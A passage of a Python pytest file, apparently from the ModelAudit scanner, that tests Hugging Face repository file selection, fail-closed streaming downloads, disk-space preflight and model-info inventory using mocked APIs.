            _HF_TEST_REVISION,
            scannable_extensions={".onnx"},
            scannable_scanner_ids={"onnx"},
        )

        assert selected_files.filenames == ["model.onnx"]

    @patch("requests.get")
    def test_select_streamable_flax_excludes_non_ascii_bpe_text_owner(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """Printable non-ASCII tokenizer text must not be selected as inconclusive Flax."""
        payload = ("#version: 0.2\n" + "Ġ hello\n" * 300_000).encode("utf-8")
        mock_requests_get.side_effect = _fake_range_responder(payload)

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["known.msgpack", "merges.txt"],
            _HF_TEST_REVISION,
            scannable_extensions={".msgpack", ".flax", ".orbax", ".jax"},
            scannable_scanner_ids={"flax_msgpack"},
        )

        assert selected_files.filenames == ["known.msgpack"]

    @patch("requests.get")
    def test_select_streamable_protobuf_excludes_ascii_varint_text_near_match(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """ASCII text starting with a weak ONNX varint tag must remain text-owned."""
        payload = (b"(h benign ascii text\n") * 4097
        mock_requests_get.side_effect = _fake_range_responder(payload)

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["model.onnx", "notes.txt"],
            _HF_TEST_REVISION,
            scannable_extensions={".onnx"},
            scannable_scanner_ids={"onnx"},
        )

        assert selected_files.filenames == ["model.onnx"]

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "renamed.jpg"], _HF_TEST_REVISION, None),
    )
    @patch(
        "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
        return_value="safetensors",
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_exact_safetensors_selection_sniffs_renamed_files(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        _mock_list_repo_files: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Exact SafeTensors scanner selection must still inspect renamed candidates."""
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({"model.safetensors": 500, "renamed.jpg": 500}, _HF_TEST_REVISION),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
            lambda _repo_id, scanned_filename, _revision, **_kwargs: _fake_remote_safetensors_scan(scanned_filename),
        )

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        assert [result[0] for result in results] == [Path("model.safetensors"), Path("renamed.jpg")]
        assert results[-1][1] is True
        mock_detect_content.assert_called_once_with("test/model", "renamed.jpg", _HF_TEST_REVISION, ANY)
        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "renamed.jpg"], _HF_TEST_REVISION, None),
    )
    @patch(
        "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
        return_value="pickle",
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_extension_rejects_other_renamed_formats(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        _mock_list_repo_files: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Content sniffing must not widen an explicit scanner selection."""
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({"model.safetensors": 500}, _HF_TEST_REVISION),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
            lambda _repo_id, scanned_filename, _revision, **_kwargs: _fake_remote_safetensors_scan(scanned_filename),
        )

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        assert len(results) == 1
        path, is_last, scan_result = cast(tuple[Path, bool, Any], results[0])
        assert path == Path("model.safetensors")
        assert is_last is True
        assert scan_result.metadata["remote_header_only"] is True
        mock_hf_hub_download.assert_not_called()
        mock_detect_content.assert_called_once_with("test/model", "renamed.jpg", _HF_TEST_REVISION, ANY)

    def test_download_model_streaming_honors_safetensors_scanner_exclusion(
        self,
        tmp_path: Path,
    ) -> None:
        """A selected suffix must not run a scanner excluded by explicit policy."""
        downloaded_path = tmp_path / "model.safetensors"
        downloaded_path.write_bytes(b"downloaded")

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(["model.safetensors"], _HF_TEST_REVISION, None),
            ),
            patch(
                "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
                side_effect=AssertionError("excluded SafeTensors scanner should not run"),
            ) as mock_scan_header,
            patch("huggingface_hub.hf_hub_download", return_value=str(downloaded_path)) as mock_hf_hub_download,
            patch("requests.get") as mock_requests_get,
        ):
            results = list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"metadata"},
                    _include_scan_results=True,
                )
            )

        assert results == [(downloaded_path, True)]
        mock_requests_get.assert_not_called()
        mock_scan_header.assert_not_called()
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="model.safetensors",
            revision=_HF_TEST_REVISION,
        )

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_known_suffix_does_not_hide_extensionless_overflow(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Known suffixes must not suppress incomplete extensionless candidate coverage."""
        repo_files = ["model.bin", *(f"payloads/chunk-{idx:04d}" for idx in range(1000))]

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            pytest.raises(
                Exception,
                match="Refusing to stream-download extensionless files from test/model: "
                "repository listing exceeds the bounded extensionless candidate limit",
            ),
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(None, None, "timed out after 30 seconds"),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_listing_timeout_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Streaming mode should fail closed when repo listing times out."""
        with pytest.raises(Exception, match="Timeout listing files in repository test/model"):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(None, None, "repository listing unavailable"),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_listing_error_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Streaming mode should fail closed when repo listing errors out."""
        with pytest.raises(
            Exception,
            match="Failed listing files in repository test/model: repository listing unavailable",
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["README.md", "notes.txt"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_listing_success_without_scannable_files_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """Streaming mode must not download every repo file when no scannable files are listed."""
        with pytest.raises(
            Exception,
            match="Refusing to download full snapshot for test/model: "
            "repository listing contains no recognized ModelAudit-scannable files",
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=([], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_empty_listing_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """An empty successful listing should not make streaming mode download all repo files."""
        with pytest.raises(
            Exception,
            match="Refusing to download full snapshot for test/model: "
            "repository listing contains no recognized ModelAudit-scannable files",
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload"], None, "repository listing missing immutable revision"),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_fails_closed_without_immutable_revision(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Streaming filtering must stop before probing or downloading a mutable revision."""
        with pytest.raises(Exception, match="repository listing missing immutable revision"):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_requests_get.assert_not_called()
        mock_hf_hub_download.assert_not_called()


class TestModelSizeAndDiskSpace:
    """Test model size retrieval and disk space checking."""

    @patch("builtins.__import__")
    def test_get_model_size_import_error(self, mock_import):
        """Test get_model_size returns None when HfApi is not available."""

        def side_effect(name, *args, **kwargs):
            if name == "huggingface_hub":
                raise ImportError("No module")
            return __import__(name, *args, **kwargs)

        mock_import.side_effect = side_effect
        size = get_model_size("test/model")
        assert size is None

    @patch("huggingface_hub.HfApi")
    def test_get_model_size_success(self, mock_hf_api_class):
        """Test successful model size retrieval."""
        # Mock the API and model info
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        # Create mock file info
        mock_file1 = MagicMock()
        mock_file1.size = 1024 * 1024  # 1 MB
        mock_file2 = MagicMock()
        mock_file2.size = 2048 * 1024  # 2 MB

        mock_model_info = MagicMock()
        mock_model_info.siblings = [mock_file1, mock_file2]
        mock_api.model_info.return_value = mock_model_info

        size = get_model_size("test/model")
        assert size == 3 * 1024 * 1024  # 3 MB total

    @patch("huggingface_hub.HfApi")
    def test_get_model_size_uses_requested_revision(self, mock_hf_api_class: MagicMock) -> None:
        """Model-size preflight should inspect the caller-requested revision."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_file = MagicMock()
        mock_file.size = 1024
        mock_model_info = MagicMock()
        mock_model_info.siblings = [mock_file]
        mock_api.model_info.return_value = mock_model_info

        size = get_model_size("test/model", revision=_HF_TEST_REVISION)

        assert size == 1024
        mock_api.model_info.assert_called_once_with("test/model", revision=_HF_TEST_REVISION)

    @patch("huggingface_hub.HfApi")
    def test_get_model_size_no_siblings(self, mock_hf_api_class):
        """Test model size when no siblings info available."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        mock_model_info = MagicMock()
        mock_model_info.siblings = None
        mock_api.model_info.return_value = mock_model_info

        size = get_model_size("test/model")
        assert size is None

    @patch("huggingface_hub.HfApi")
    def test_get_model_size_api_error(self, mock_hf_api_class):
        """Test model size returns None on API error."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_api.model_info.side_effect = Exception("API error")

        size = get_model_size("test/model")
        assert size is None

    @patch("modelaudit.utils.sources.huggingface.get_model_size")
    @patch("modelaudit.utils.sources.huggingface.check_disk_space")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_insufficient_disk_space(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_check_disk_space: MagicMock,
        mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Test download fails gracefully when disk space is insufficient (with custom cache)."""
        # Mock model size
        mock_get_model_size.return_value = 10 * 1024 * 1024 * 1024  # 10 GB

        # Mock disk space check to fail
        mock_check_disk_space.return_value = (False, "Insufficient disk space. Required: 12.0 GB, Available: 5.0 GB")

        # Test download failure with custom cache directory (this enables disk space checking)
        cache_dir = tmp_path / "custom_cache"
        with pytest.raises(Exception, match=r"Cannot download model.*Insufficient disk space"):
            download_model("https://huggingface.co/test/model", cache_dir=cache_dir)

        # Verify snapshot_download was not called
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface.get_model_size")
    @patch("modelaudit.utils.sources.huggingface.check_disk_space")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["config.json", "pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_with_disk_space_check(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_check_disk_space: MagicMock,
        mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Test successful download with disk space check when using custom cache."""
        # Mock model size
        mock_get_model_size.return_value = 1024 * 1024 * 1024  # 1 GB

        # Mock disk space check to pass
        mock_check_disk_space.return_value = (True, "Sufficient disk space available (10.0 GB)")

        # Mock snapshot download
        mock_path = tmp_path / "test_model"
        mock_path.mkdir()
        (mock_path / "config.json").write_text("{}")
        (mock_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(mock_path)

        # Test download with custom cache directory (this enables disk space checking)
        cache_dir = tmp_path / "custom_cache"
        result = download_model("https://huggingface.co/test/model", cache_dir=cache_dir)

        # Verify disk space was checked
        mock_check_disk_space.assert_called_once()

        # Verify download proceeded
        mock_snapshot_download.assert_called_once()
        assert result == mock_path

    @patch("modelaudit.utils.sources.huggingface.get_model_size")
    @patch("modelaudit.utils.sources.huggingface.check_disk_space")
    @patch("modelaudit.utils.sources.huggingface._get_hf_cache_root")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["config.json", "pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_without_cache_dir_checks_default_hf_cache(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_get_hf_cache_root: MagicMock,
        mock_check_disk_space: MagicMock,
        mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Disk preflight should run against the default HF cache root when no cache_dir is supplied."""
        mock_get_model_size.return_value = 1024 * 1024
        mock_check_disk_space.return_value = (True, "Sufficient disk space available")

        hf_cache_root = tmp_path / "hf-cache" / "hub"
        mock_get_hf_cache_root.return_value = hf_cache_root

        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "config.json").write_text("{}")
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)

        download_model("https://huggingface.co/test/model")

        assert hf_cache_root.exists()
        mock_check_disk_space.assert_called_once_with(hf_cache_root, 1024 * 1024)

    def test_download_model_filtered_selection_checks_only_selected_disk_size(self, tmp_path: Path) -> None:
        """Scanner-filtered downloads must not require space for unrelated repository artifacts."""
        repo_files = ["model.onnx", "model-00000-of-00001.safetensors"]
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model.onnx").write_bytes(_MINIMAL_ONNX_MODEL_PROTO)

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch(
                "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
                return_value="safetensors",
            ),
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                return_value=({"model.onnx": 100}, _HF_TEST_REVISION),
            ) as mock_get_sizes,
            patch("modelaudit.utils.sources.huggingface._get_model_size_with_deadline") as mock_repo_size,
            patch(
                "modelaudit.utils.sources.huggingface.check_disk_space",
                return_value=(True, "sufficient selected space"),
            ) as mock_check_disk_space,
            patch("huggingface_hub.snapshot_download", return_value=str(download_path)),
        ):
            result = download_model(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path / "cache",
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )

        assert result == download_path
        mock_repo_size.assert_not_called()
        assert mock_get_sizes.call_args.args[1] == ["model.onnx"]
        mock_check_disk_space.assert_called_once()
        disk_check_path, required_size = mock_check_disk_space.call_args.args
        assert required_size == 100
        assert Path(disk_check_path).parent == (
            tmp_path / "cache" / "huggingface" / ".modelaudit-selections" / "test" / "model"
        )


class TestGetModelInfo:
    """Test retrieving model metadata from HuggingFace."""

    def test_standard_model_info_includes_openvino_weights_companion(self) -> None:
        """Standard filtered previews must count the BIN file acquired with a selected XML model."""
        repo_files = ["model.xml", "model.bin"]
        repo_info = SimpleNamespace(modelId="test/model", author="test", siblings=[])
        with (
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                return_value=({"model.xml": 100, "model.bin": 1_000_000}, _HF_TEST_REVISION),
            ),
            patch(
                "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
                return_value="openvino",
            ),
        ):
            info = _build_huggingface_model_info(
                "test/model",
                repo_info,
                repo_files,
                _HF_TEST_REVISION,
                scannable_extensions={".xml"},
                scannable_scanner_ids={"openvino"},
            )

        assert info["file_count"] == 2
        assert info["total_size"] == 1_000_100
        assert [file_info["name"] for file_info in info["files"]] == repo_files

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_with_author(self, mock_hf_api_class: MagicMock) -> None:
        """Ensure author is returned when available."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            author="test-author",
            siblings=[
                SimpleNamespace(rfilename=".gitattributes", size=10),
                SimpleNamespace(rfilename="config.json", size=100),
                SimpleNamespace(rfilename="README.md", size=50),
            ],
        )
        mock_api.get_paths_info.return_value = [
            SimpleNamespace(path="config.json", size=100),
            SimpleNamespace(path="README.md", size=50),
        ]

        info = get_model_info("https://huggingface.co/test/model")

        assert info["author"] == "test-author"
        assert info["total_size"] == 150
        assert info["file_count"] == 2
        assert info["files"] == [
            {"name": "config.json", "size": 100, "access": "available"},
            {"name": "README.md", "size": 50, "access": "available"},
        ]
        mock_api.repo_info.assert_called_once_with("test/model", files_metadata=True)
        mock_api.get_paths_info.assert_called_once_with(
            "test/model",
            ["config.json", "README.md"],
            revision=_HF_TEST_REVISION,
        )

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_passes_requested_revision_to_repo_info(self, mock_hf_api_class: MagicMock) -> None:
        """Preview inventory should honor requested revisions before pinning to the returned commit SHA."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            author="test-author",
            siblings=[SimpleNamespace(rfilename="config.json", size=100)],
        )
        mock_api.get_paths_info.return_value = [SimpleNamespace(path="config.json", size=100)]

        info = get_model_info("https://huggingface.co/test/model?revision=refs%2Fpr%2F1")

        assert info["revision"] == _HF_TEST_REVISION
        assert info["total_size"] == 100
        mock_api.repo_info.assert_called_once_with("test/model", files_metadata=True, revision="refs/pr/1")
        mock_api.get_paths_info.assert_called_once_with(
            "test/model",
            ["config.json"],
            revision=_HF_TEST_REVISION,
        )

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_without_author(self, mock_hf_api_class: MagicMock) -> None:
        """Default to empty string when author is missing."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            siblings=[SimpleNamespace(rfilename="config.json", size=42)],
            modelId="test/model",
        )
        mock_api.get_paths_info.return_value = [SimpleNamespace(path="config.json", size=42)]

        info = get_model_info("https://huggingface.co/test/model")

        assert info["author"] == ""
        assert info["total_size"] == 42
        assert info["file_count"] == 1

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_counts_recursive_selected_lfs_bytes(self, mock_hf_api_class: MagicMock) -> None:
        """Preview inventory should use the same recursive selected files as downloads."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            author="tester",
            siblings=[
                SimpleNamespace(rfilename=".gitattributes", size=64),
                SimpleNamespace(rfilename="README.md", size=12),
                SimpleNamespace(rfilename="nested/config.json", size=20),
                SimpleNamespace(rfilename="nested/model.safetensors", size=10_000),
                SimpleNamespace(rfilename="preview.png", size=500),
            ],
        )
        mock_api.get_paths_info.return_value = [
            SimpleNamespace(path="README.md", size=12),
            SimpleNamespace(path="nested/config.json", size=20),
            SimpleNamespace(path="nested/model.safetensors", size=10_000),
        ]

        with patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None):
            info = get_model_info("hf://test/model")

        assert info["file_count"] == 3
        assert info["repo_file_count"] == 5
        assert info["total_size"] == 10_032
        assert info["accessible_size"] == 10_032
        assert info["inventory_status"] == "complete"
        assert [file_info["name"] for file_info in info["files"]] == [
            "README.md",
            "nested/config.json",
            "nested/model.safetensors",
        ]

    def test_get_model_info_preview_matches_download_recursive_selection(self, tmp_path: Path) -> None:
        """Preview metadata and snapshot download should select the same recursive files."""
        repo_files = [
            ".gitattributes",
            "README.md",
            "nested/config.json",
            "nested/model.safetensors",
            "assets/preview.png",
            "renamed.jpg",
        ]
        expected_files = [
            "README.md",
            "nested/config.json",
            "nested/model.safetensors",
            "renamed.jpg",
        ]
        mock_api = MagicMock()
        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            siblings=[
                SimpleNamespace(rfilename=".gitattributes", size=64),
                SimpleNamespace(rfilename="README.md", size=12),
                SimpleNamespace(rfilename="nested/config.json", size=20),
                SimpleNamespace(rfilename="nested/model.safetensors", size=10_000),
                SimpleNamespace(rfilename="assets/preview.png", size=500),
                SimpleNamespace(rfilename="renamed.jpg", size=2000),
            ],
        )
        mock_api.get_paths_info.return_value = [
            SimpleNamespace(path="README.md", size=12),
            SimpleNamespace(path="nested/config.json", size=20),
            SimpleNamespace(path="nested/model.safetensors", size=10_000),
            SimpleNamespace(path="renamed.jpg", size=2000),
        ]

        def detect_side_effect(_repo_id: str, filename: str, _revision: str, _budget: object) -> str | None:
            return "pytorch" if filename == "renamed.jpg" else None

        download_root = tmp_path / "downloaded"

        def snapshot_side_effect(**kwargs: object) -> str:
            allow_patterns = cast(list[str], kwargs["allow_patterns"])
            for filename in allow_patterns:
                path = download_root / filename
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_bytes(b"x")
            return str(download_root)

        with (
            patch("huggingface_hub.HfApi", return_value=mock_api),
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            patch("modelaudit.utils.sources.huggingface._get_model_size_with_deadline", return_value=None),
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format") as mock_detect,
            patch("huggingface_hub.snapshot_download", side_effect=snapshot_side_effect) as mock_snapshot_download,
        ):
            mock_detect.side_effect = detect_side_effect
            info = get_model_info("hf://test/model")
            downloaded_path = download_model("hf://test/model", cache_dir=tmp_path / "cache")

        assert [file_info["name"] for file_info in info["files"]] == expected_files
        assert info["total_size"] == 12_032
        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == expected_files
        assert sorted(
            path.relative_to(downloaded_path).as_posix() for path in downloaded_path.rglob("*") if path.is_file()
        ) == sorted(expected_files)

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_streaming_selection_uses_streamable_policy(
        self,
        mock_hf_api_class: MagicMock,
    ) -> None:
        """Streaming preview inventory should match streaming prefilter semantics."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            siblings=[
                SimpleNamespace(rfilename=".gitattributes", size=64),
                SimpleNamespace(rfilename="README.md", size=100),
                SimpleNamespace(rfilename="model_card", size=50),
                SimpleNamespace(rfilename="model.safetensors", size=10_000),
                SimpleNamespace(rfilename="src/helper.py", size=400),
            ],
        )
        mock_api.get_paths_info.return_value = [
            SimpleNamespace(path="README.md", size=100),
            SimpleNamespace(path="model_card", size=50),
        ]

        with patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None):
            info = get_model_info(
                "hf://test/model",
                streaming_selection=True,
                scannable_extensions={".md"},
                scannable_filenames={"model_card"},
                scannable_scanner_ids={"metadata"},
                include_all_files=False,
            )

        assert info["file_count"] == 2
        assert info["total_size"] == 150
        assert [file_info["name"] for file_info in info["files"]] == ["README.md", "model_card"]
        mock_api.get_paths_info.assert_called_once_with(
            "test/model",
            ["README.md", "model_card"],
            revision=_HF_TEST_REVISION,
        )

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_timeout_deadline_reaches_probes_and_path_sizes(
        self,
        mock_hf_api_class: MagicMock,
    ) -> None:
        """Preview timeout should bound content probes and path-size metadata."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            siblings=[
                SimpleNamespace(rfilename="model.safetensors", size=1000),
                SimpleNamespace(rfilename="renamed.payload", size=2000),
            ],
        )
        probe_deadlines: list[float | None] = []
        path_size_deadlines: list[float | None] = []

        def detect_side_effect(
            _repo_id: str,
            _filename: str,
            _revision: str,
            budget: _HuggingFaceProbeBudget,
        ) -> str | None:
            probe_deadlines.append(budget.deadline)
            return "pytorch"

        def path_sizes_side_effect(
            _repo_id: str,
            _filenames: list[str],
            **kwargs: object,
        ) -> tuple[dict[str, int | None], str]:
            deadline = kwargs.get("deadline")
            path_size_deadlines.append(deadline if isinstance(deadline, float) else None)
            return {"model.safetensors": 1000, "renamed.payload": 2000}, _HF_TEST_REVISION

        with (
            patch(
                "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
                side_effect=detect_side_effect,
            ),
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                side_effect=path_sizes_side_effect,
            ),
        ):
            info = get_model_info("hf://test/model", timeout_seconds=12)

        assert info["total_size"] == 3000
        repo_info_timeout = mock_api.repo_info.call_args.kwargs["timeout"]
        assert 0 < repo_info_timeout <= 12
        assert probe_deadlines and all(deadline is not None for deadline in probe_deadlines)
        assert path_size_deadlines and all(deadline is not None for deadline in path_size_deadlines)
        assert path_size_deadlines[0] == probe_deadlines[0]

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_still_counts_renamed_detected_payload(
        self,
        mock_hf_api_class: MagicMock,
    ) -> None:
        """Bookkeeping skips must not suppress content-detected payload inventory."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            siblings=[
                SimpleNamespace(rfilename=".gitattributes", size=64),
                SimpleNamespace(rfilename="model.safetensors", size=1000),
                SimpleNamespace(rfilename="preview.jpg", size=2000),
            ],
        )
        mock_api.get_paths_info.return_value = [
            SimpleNamespace(path="model.safetensors", size=1000),
            SimpleNamespace(path="preview.jpg", size=2000),
        ]

        with patch(
            "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
            return_value="pytorch",
        ) as mock_detect_content:
            info = get_model_info("hf://test/model")

        assert info["file_count"] == 2
        assert info["total_size"] == 3000
        assert [file_info["name"] for file_info in info["files"]] == ["model.safetensors", "preview.jpg"]
        mock_detect_content.assert_called_once_with("test/model", "preview.jpg", _HF_TEST_REVISION, ANY)

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_marks_gated_content_probe_only_inventory_incomplete(
        self,
        mock_hf_api_class: MagicMock,
    ) -> None:
        """Gated content-probe candidates must not disappear into complete empty inventory."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_api.repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            modelId="test/model",
            gated="auto",
            siblings=[
                SimpleNamespace(rfilename=".gitattributes", size=64),
                SimpleNamespace(rfilename="hidden.payload", size=None, lfs=SimpleNamespace(size=4096)),
            ],
        )
        mock_api.get_paths_info.side_effect = RuntimeError("403 Forbidden: gated repository")

        with patch(
            "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
            side_effect=PermissionError("401 Unauthorized: gated file https://huggingface.co/test/model?token=secret"),
        ) as mock_detect_content:
            info = get_model_info("https://huggingface.co/test/model")

        assert info["revision"] == _HF_TEST_REVISION
        assert info["inventory_status"] == "gated_inaccessible"
        assert info["total_size"] == 4096
        assert info["accessible_size"] == 0
        assert info["inaccessible_gated_bytes"] == 4096
        assert info["inaccessible_gated_file_count"] == 1
        assert info["inaccessible_gated_files"] == ["hidden.payload"]
        assert info["unknown_size_count"] == 0
        assert info["file_count"] == 1
        assert info["files"] == [{"name": "hidden.payload", "size": 4096, "access": "gated"}]
        assert "secret" not in str(info["inventory_error"])
        mock_api.get_paths_info.assert_called_once_with(
            "test/model",
            ["hidden.payload"],
            revision=_HF_TEST_REVISION,
        )
        mock_detect_content.assert_called_once_with("test/model", "hidden.payload", _HF_TEST_REVISION, ANY)

    @patch("huggingface_hub.HfApi")
